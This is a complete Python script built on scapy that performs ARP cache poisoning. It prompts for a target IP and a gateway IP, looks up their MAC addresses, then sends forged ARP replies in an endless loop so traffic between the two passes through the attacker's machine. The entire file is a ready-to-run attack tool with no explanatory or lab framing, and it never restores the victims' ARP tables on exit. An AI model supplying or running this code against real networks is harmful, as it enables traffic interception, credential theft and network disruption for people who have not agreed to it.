from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, send
import time


def get_mac(ip: str):
    """
    Sends an ARP request to the IP and returns the MAC address
    """
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(arp_request, timeout=3, verbose=False)[0]
    if result:
        return result[0][1].hwsrc
    return None


def arp_poison(target_ip: str, gateway_ip: str):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("Could not find MAC addresses.")
        return

    packet_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    packet_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    try:
        while True:
            send(packet_to_target, verbose=False)
            send(packet_to_gateway, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopping attack.")


if __name__ == '__main__':
    target = input("Target IP: ")
    gateway = input("Gateway IP: ")
    arp_poison(target, gateway)